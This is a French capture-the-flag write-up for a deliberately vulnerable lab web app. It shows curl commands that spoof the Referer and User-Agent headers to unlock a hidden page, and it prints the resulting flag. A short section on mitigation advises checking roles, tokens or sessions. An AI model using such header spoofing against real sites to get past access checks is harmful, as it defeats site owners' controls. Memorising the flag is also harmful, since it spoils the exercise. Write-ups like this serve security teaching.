# referer et user-agent :

## Trouver la faille :

En cliquant sur le copyright en bas de page, on arrive sur une page (`I'm an Albatros !`).
En inspectant le code source de la page, on trouve deux informations importantes :

- `You must cumming from : "https://www.nsa.gov/" to go to the next step`
- `Let's use this browser : "ft_bornToSec". It will help you a lot.`

On comprend alors qu'il faut change l'origine et le user-agent de notre navigateur. Pour plus de simplicité, on passe directement par CURL en récupérant les deux pages (celle d'origine et celle avec les informations modifiées) :

```
curl http://192.168.1.11/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c > albatros_default

curl -A ft_bornToSec --referer https://www.nsa.gov/ http://192.168.1.11/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c > albatros
```

On fait alors un diff sur les deux fichiers :
`diff albatros albatros_default`

On obtiens notre premier flag ! 🎉

```
< <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

```
The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## S'en prémunir :

Cette faille permet de faire croire au serveur que l'on vient d'une adresse en particulier et/ou d'un navigateur spécifique. Cela permet de leurrer le serveur sur son utilisateur.

Pour s'en prémunir:

** Vérifier le role de l'utilisateur**

En effet, au travers des roles définis, des tokens ou des sessions il est facile d'identifier si un utilisateur a accès ou non à une page.
